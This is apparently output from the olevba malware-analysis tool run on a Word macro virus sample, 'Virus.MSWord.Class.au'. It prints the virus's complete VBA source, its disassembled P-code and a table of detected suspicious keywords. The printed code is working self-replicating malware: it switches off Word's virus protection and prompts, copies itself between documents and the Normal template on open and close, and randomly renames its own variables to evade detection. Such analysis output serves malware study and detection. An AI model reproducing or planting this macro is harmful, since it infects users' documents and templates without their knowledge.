olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.au
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.au - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
II6257 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
JM3028 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set HU4624 = ActiveDocument.VBProject.VBComponents.Item(1)
GI9222 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set HU4624 = NormalTemplate.VBProject.VBComponents.Item(1)
ML578 = True
Call AA8233_RL945
End If
If ML578 <> True And GI9222 <> True Then GoTo GN2985
If ML578 = True Then HU4624.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, II6257 - 1))
If GI9222 = True Then HU4624.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, JM3028 - 1))
GN2985:
If JM3028 <> 0 And II6257 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Sub AA8233_RL945()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "LG7640": r1(2) = "TF823": r1(3) = "HH5460": r1(4) = "FS5997": r1(5) = "RL945": r1(6) = "II6257"
r1(7) = "JM3028": r1(8) = "GI9222":: r1(9) = "HU4624": r1(10) = "ML578": r1(11) = "GN2985": r1(12) = "AA8233": r1(13) = "NF1647": r1(14) = "VD7866"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call RL945(a1, r1(x))
Next x
End Sub
Private Sub RL945(VD7866, NF1647 As String)  'v1.0
On Error Resume Next
Dim LG7640 As Long: Dim TF823 As Long: Dim HH5460 As Long: Dim FS5997 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
LG7640 = 1: TF823 = 1: HH5460 = .CountOfLines: FS5997 = Len(.Lines(.CountOfLines, 1))
Do While .Find(NF1647, LG7640, TF823, HH5460, FS5997, True)
strline = .Lines(LG7640, 1)
strline = Left(strline, TF823 - 1) & VD7866 & Mid(strline, FS5997)
.replaceline LG7640, strline
LG7640 = HH5460 + 1: TF823 = 1: DD2134 = .CountOfLines
FS5997 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Class.au
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8811 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St II6257 
' Line #6:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St JM3028 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set HU4624 
' Line #9:
' 	LitVarSpecial (True)
' 	St GI9222 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set HU4624 
' Line #13:
' 	LitVarSpecial (True)
' 	St ML578 
' Line #14:
' 	ArgsCall (Call) AA8233_RL945 0x0000 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	Ld ML578 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld GI9222 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo GN2985 
' 	EndIf 
' Line #17:
' 	Ld ML578 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000F "Sub AutoClose()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld II6257 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld HU4624 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #18:
' 	Ld GI9222 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000E "Sub AutoOpen()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld JM3028 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld HU4624 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #19:
' 	Label GN2985 
' Line #20:
' 	Ld JM3028 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld II6257 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Private Sub AA8233_RL945())
' Line #23:
' 	OnError (Resume Next) 
' Line #24:
' 	ArgsCall Read 0x0000 
' Line #25:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	VarDefn r1 (As String)
' Line #26:
' 	LitStr 0x0006 "LG7640"
' 	LitDI2 0x0001 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "TF823"
' 	LitDI2 0x0002 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "HH5460"
' 	LitDI2 0x0003 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "FS5997"
' 	LitDI2 0x0004 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "RL945"
' 	LitDI2 0x0005 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "II6257"
' 	LitDI2 0x0006 
' 	ArgsSt r1 0x0001 
' Line #27:
' 	LitStr 0x0006 "JM3028"
' 	LitDI2 0x0007 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "GI9222"
' 	LitDI2 0x0008 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	BoS 0x0000 
' 	LitStr 0x0006 "HU4624"
' 	LitDI2 0x0009 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0005 "ML578"
' 	LitDI2 0x000A 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "GN2985"
' 	LitDI2 0x000B 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "AA8233"
' 	LitDI2 0x000C 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "NF1647"
' 	LitDI2 0x000D 
' 	ArgsSt r1 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0006 "VD7866"
' 	LitDI2 0x000E 
' 	ArgsSt r1 0x0001 
' Line #28:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000E 
' 	For 
' Line #29:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St a1 
' Line #30:
' 	Ld a1 
' 	Ld x 
' 	ArgsLd r1 0x0001 
' 	ArgsCall (Call) RL945 0x0002 
' Line #31:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	EndSub 
' Line #33:
' 	FuncDefn (Private Sub RL945(VD7866, NF1647 As String))
' 	QuoteRem 0x002D 0x0004 "v1.0"
' Line #34:
' 	OnError (Resume Next) 
' Line #35:
' 	Dim 
' 	VarDefn LG7640 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn TF823 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn HH5460 (As Long)
' 	BoS 0x0000 
' 	Dim 
' 	VarDefn FS5997 (As Long)
' Line #36:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #37:
' 	LitDI2 0x0001 
' 	St LG7640 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St TF823 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St HH5460 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St FS5997 
' Line #38:
' 	Ld NF1647 
' 	Ld LG7640 
' 	Ld TF823 
' 	Ld HH5460 
' 	Ld FS5997 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #39:
' 	Ld LG7640 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strline 
' Line #40:
' 	Ld strline 
' 	Ld TF823 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld VD7866 
' 	Concat 
' 	Ld strline 
' 	Ld FS5997 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strline 
' Line #41:
' 	Ld LG7640 
' 	Ld strline 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #42:
' 	Ld HH5460 
' 	LitDI2 0x0001 
' 	Add 
' 	St LG7640 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St TF823 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St DD2134 
' Line #43:
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St FS5997 
' Line #44:
' 	Loop 
' Line #45:
' 	EndWith 
' Line #46:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |MSWord.Class        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

